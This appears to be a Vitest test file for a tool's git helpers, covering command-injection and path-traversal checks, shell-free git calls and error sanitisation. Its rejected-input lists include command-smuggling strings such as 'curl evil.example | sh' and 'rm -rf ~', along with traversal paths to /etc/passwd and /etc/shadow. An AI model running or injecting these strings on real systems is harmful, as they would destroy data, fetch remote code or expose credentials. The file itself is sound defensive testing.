import { beforeEach, describe, expect, it, vi } from 'vitest';
import { spawnSync } from 'child_process';
import {
  getDiff,
  getRemoteBranch,
  validateFilePath,
  validateRemote,
} from '../src/utils/git.js';

vi.mock('child_process', () => ({ spawnSync: vi.fn() }));

const spawnSyncMock = vi.mocked(spawnSync);
const EMPTY_TREE = '4b825dc642cb6eb9a060e54bf8d69288fbee4904';

type GitResponse = { status?: number; stdout?: string; error?: Error };

/**
 * Routes mocked `git` invocations by their joined argument list.
 * Anything not listed fails like a real non-zero git exit.
 */
function mockGit(responses: Record<string, GitResponse>) {
  spawnSyncMock.mockImplementation(((_cmd: string, args: readonly string[]) => {
    const response = responses[args.join(' ')] ?? { status: 128 };
    return { status: 0, stdout: '', ...response };
  }) as unknown as typeof spawnSync);
}

function gitCalls(): string[][] {
  return spawnSyncMock.mock.calls.map(([, args]) => [...(args as string[])]);
}

describe('validateRemote (command injection)', () => {
  it.each(['origin', 'upstream', 'my-fork', 'fork_2'])('accepts %s', (remote) => {
    expect(() => validateRemote(remote)).not.toThrow();
  });

  it.each([
    'origin; rm -rf ~',
    'origin && curl evil.example | sh',
    'origin | cat /etc/passwd',
    '$(whoami)',
    '`id`',
    'origin\nrm -rf ~',
    'origin main',
    '../origin',
    'origin/main',
    '--upload-pack=touch /tmp/pwned',
    '',
  ])('rejects %j', (remote) => {
    expect(() => validateRemote(remote)).toThrow(/Invalid remote name/);
  });
});

describe('validateFilePath (path traversal)', () => {
  const repo = '/home/dev/project';

  it.each(['src/index.ts', 'README.md', 'a/b/c/d.txt', './src/cli.ts'])('accepts %s', (path) => {
    expect(validateFilePath(path, repo)).toBe(true);
  });

  it.each([
    ['parent traversal', '../etc/passwd'],
    ['nested traversal', 'src/../../etc/passwd'],
    ['deep traversal', 'a/b/../../../../etc/shadow'],
    ['absolute path', '/etc/passwd'],
    ['null byte', 'src/index.ts\0.png'],
    ['UNC path', '\\\\attacker\\share\\payload'],
  ])('rejects a %s', (_label, path) => {
    expect(validateFilePath(path, repo)).toBe(false);
  });
});

describe('git command execution', () => {
  beforeEach(() => {
    spawnSyncMock.mockReset();
  });

  it('runs git without a shell and with arguments as an array', () => {
    mockGit({
      'rev-parse --show-toplevel': { stdout: '/repo\n' },
      'rev-parse --abbrev-ref HEAD': { stdout: 'main\n' },
      'rev-parse --verify origin/main': {},
      'diff origin/main HEAD': { stdout: 'diff --git a/x b/x\n' },
    });

    expect(getDiff()).toBe('diff --git a/x b/x\n');

    for (const [cmd, args, options] of spawnSyncMock.mock.calls) {
      expect(cmd).toBe('git');
      expect(Array.isArray(args)).toBe(true);
      expect(options).toMatchObject({ shell: false });
    }
    expect(gitCalls()).toContainEqual(['diff', 'origin/main', 'HEAD']);
  });

  it('never invokes git when the remote name is malicious', () => {
    expect(() => getDiff('origin; rm -rf ~')).toThrow(/Failed to get git diff/);
    expect(spawnSyncMock).not.toHaveBeenCalled();
  });

  it('refuses to build a ref from a branch name with shell metacharacters', () => {
    mockGit({ 'rev-parse --abbrev-ref HEAD': { stdout: 'main;curl evil.example|sh\n' } });

    expect(getRemoteBranch()).toBeNull();
    expect(gitCalls().some((args) => args[0] === 'rev-parse' && args[1] === '--verify')).toBe(false);
  });

  it('diffs against the empty tree on a first push', () => {
    mockGit({
      'rev-parse --show-toplevel': { stdout: '/repo\n' },
      'rev-parse --abbrev-ref HEAD': { stdout: 'feature/new\n' },
      [`diff ${EMPTY_TREE} HEAD`]: { stdout: 'all files as new' },
    });

    expect(getDiff()).toBe('all files as new');
  });

  it('skips unsafe file names when building a first-push diff by hand', () => {
    mockGit({
      'rev-parse --show-toplevel': { stdout: '/repo\n' },
      'rev-parse --abbrev-ref HEAD': { stdout: 'main\n' },
      'ls-tree -r --name-only HEAD': { stdout: 'src/ok.ts\n../../etc/passwd\n/etc/shadow\n' },
      'show HEAD -- src/ok.ts': { stdout: 'export {};' },
    });

    const diff = getDiff();

    expect(diff).toContain('+++ b/src/ok.ts');
    expect(diff).not.toContain('passwd');
    expect(diff).not.toContain('shadow');
    const shown = gitCalls().filter((args) => args[0] === 'show').map((args) => args[3]);
    expect(shown).toEqual(['src/ok.ts']);
  });
});

describe('error sanitisation', () => {
  beforeEach(() => {
    spawnSyncMock.mockReset();
  });

  it('replaces filesystem paths in git errors with a placeholder', () => {
    mockGit({
      'rev-parse --show-toplevel': { stdout: '/repo\n' },
      'rev-parse --abbrev-ref HEAD': { stdout: 'main\n' },
      'rev-parse --verify origin/main': {},
      'diff origin/main HEAD': {
        error: new Error('EACCES: permission denied, open /home/alice/secret-project/.git/index'),
      },
    });

    let message = '';
    try {
      getDiff();
    } catch (error) {
      message = (error as Error).message;
    }

    expect(message).toContain('Failed to get git diff');
    expect(message).toContain('[path]');
    expect(message).not.toContain('alice');
    expect(message).not.toContain('secret-project');
  });

  it('caps the underlying error detail at 200 characters', () => {
    mockGit({
      'rev-parse --show-toplevel': { stdout: '/repo\n' },
      'rev-parse --abbrev-ref HEAD': { stdout: 'main\n' },
      'rev-parse --verify origin/main': {},
      'diff origin/main HEAD': { error: new Error('x'.repeat(5000)) },
    });

    let message = '';
    try {
      getDiff();
    } catch (error) {
      message = (error as Error).message;
    }

    const firstLine = message.split('\n')[0];
    expect(firstLine.replace('Failed to get git diff: ', '').length).toBeLessThanOrEqual(200);
  });
});
